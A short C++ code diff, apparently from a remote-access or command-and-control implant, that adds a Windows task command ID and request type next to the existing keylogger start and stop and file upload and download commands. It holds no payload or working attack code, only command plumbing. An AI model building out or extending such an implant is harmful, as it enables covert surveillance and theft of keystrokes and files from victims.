@@ -38,8 +38,9 @@
 #define NET_ASM 10
 #define OBJECT_FILE 11
 #define GET_UID 12
-#define KEYLOGGER_START 13
-#define KEYLOGGER_STOP 14
+#define WIN_TASK 13
+#define KEYLOGGER_START 14
+#define KEYLOGGER_STOP 15
 
 // Statuses
 #define NO_FLAG 0
@@ -208,6 +209,7 @@ using Request = std::variant<
     TaskRequest<CommandUploadFile>,
     TaskRequest<CommandDownloadFile>,
     TaskRequest<CommandKeylogger>,
+    TaskRequest<CommandWinTask>,
     TaskRequest<bool>>;
 
 using Response = std::variant<
